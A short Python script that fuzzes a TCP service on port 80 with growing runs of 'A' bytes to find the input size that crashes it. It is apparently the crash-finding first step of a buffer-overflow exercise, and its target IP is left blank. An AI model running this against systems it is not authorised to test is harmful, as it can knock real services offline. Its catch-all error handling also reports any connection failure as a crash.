import socket
import time
import sys

TARGET_IP = ""
TARGET_PORT = 80
FUZZ_CHAR = b"A"
BUFFER_STEP = 100
TIMEOUT = 5

for i in range(1, 100):
    try:
        fuzz_input = FUZZ_CHAR * (BUFFER_STEP * i)
        print(f"Sending payload with {len(fuzz_input)} bytes")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((TARGET_IP, TARGET_PORT))
        s.recv(1024)
        s.recv(1024)

        s.send(fuzz_input + b'\r\n')
        s.recv(1024)

        time.sleep(1)

    except:
        print(f"Target crashed with {len(fuzz_input)} bytes")
        sys.exit(0)
